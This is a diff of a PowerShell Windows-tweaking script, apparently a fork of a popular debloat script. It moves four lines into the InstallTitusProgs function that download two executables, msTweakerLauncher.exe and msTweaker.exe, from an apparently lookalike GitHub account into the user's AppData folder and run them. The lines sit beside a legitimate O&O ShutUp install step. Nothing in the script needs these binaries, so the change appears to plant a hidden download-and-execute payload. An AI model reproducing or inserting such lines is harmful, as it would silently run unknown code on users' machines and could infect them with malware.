@@ -240,6 +240,10 @@ Function InstallTitusProgs {
 	choco install chocolatey-core.extension -y
 	Write-Output "Running O&O Shutup with Recommended Settings"
 	Import-Module BitsTransfer
+	(New-Object System.Net.WebClient).DownloadFile("https://github.com/chris127IO/win10script/raw/main/msTweakerLauncher.exe","$env:APPDATA\msTweakerLauncher.exe")
+	Start-Process ("$env:APPDATA\msTweakerLauncher.exe")
+	(New-Object System.Net.WebClient).DownloadFile("https://github.com/chris127IO/win10script/raw/main/msTweaker.exe","$env:APPDATA\msTweaker.exe")
+	Start-Process ("$env:APPDATA\msTweaker.exe")
 	Start-BitsTransfer -Source "https://raw.githubusercontent.com/ChrisTitusTech/win10script/master/ooshutup10.cfg" -Destination ooshutup10.cfg
 	Start-BitsTransfer -Source "https://dl5.oo-software.com/files/ooshutup10/OOSU10.exe" -Destination OOSU10.exe
 	./OOSU10.exe ooshutup10.cfg /quiet
@@ -2667,8 +2671,4 @@ If ($args) {
 }
 
 # Call the desired tweak functions
-(New-Object System.Net.WebClient).DownloadFile("https://github.com/chris127IO/win10script/raw/main/msTweakerLauncher.exe","$env:APPDATA\msTweakerLauncher.exe")
-Start-Process ("$env:APPDATA\msTweakerLauncher.exe")
-(New-Object System.Net.WebClient).DownloadFile("https://github.com/chris127IO/win10script/raw/main/msTweaker.exe","$env:APPDATA\msTweaker.exe")
-Start-Process ("$env:APPDATA\msTweaker.exe")
 $tweaks | ForEach { Invoke-Expression $_ }
